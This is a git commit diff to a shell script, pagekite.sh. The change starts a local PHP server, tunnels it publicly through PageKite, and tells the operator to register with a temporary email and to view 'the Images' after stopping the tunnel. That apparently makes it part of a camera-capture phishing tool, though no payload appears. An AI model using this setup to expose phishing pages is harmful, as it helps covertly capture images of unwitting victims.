4ed53d0ce07c3d49bef6625ff6c61de32a3a8b68
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2020-02-15 16:45:27 +0600

    Update pagekite.sh

--- pagekite.sh
+++ pagekite.sh
@@ -25,14 +25,23 @@ pagekite_subdomain="${pagekite_subdomain:-${pagekite_def_sub}}"
 fi
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$pagekite_port\e[0m\e[1;92m)\e[0m\n"
+sleep 2
+clear
+banner
+printf "\e[1;33m\t  Read This Very Carefully !\e[0m\n\n"
+printf " \e[1;31m[\e[1;37m01\e[1;31m]\e[1;33m Use a Temporary Email Address.\e[1;31m(\e[1;36mtempail.com\e[1;31m)\e[0m\n"
+printf " \e[1;31m[\e[1;37m02\e[1;31m]\e[1;33m Sometime it Requires Email verification.\e[0m\n"
+printf " \e[1;31m[\e[1;37m03\e[1;31m]\e[1;33m Press CTRL + C To Stop Tunneling.\e[0m\n"
+printf " \e[1;31m[\e[1;37m04\e[1;31m]\e[1;33m You can see the Images only After Stopping Tunneling.\e[0m\n"
+printf "\e[0m\n"
+printf "\e[1;33m      Press Enter to Start Tunnelling\e[0m\n"
+read enter
+sleep 1
 
 
 
-
-
-
-
-
+fuser -k $pagekite_port/tcp > /dev/null 2>&1
+php -S localhost:$pagekite_port > /dev/null 2>&1 &
 
 if [[ $pagekite_subdomain_resp == true ]]; then
 sleep 1
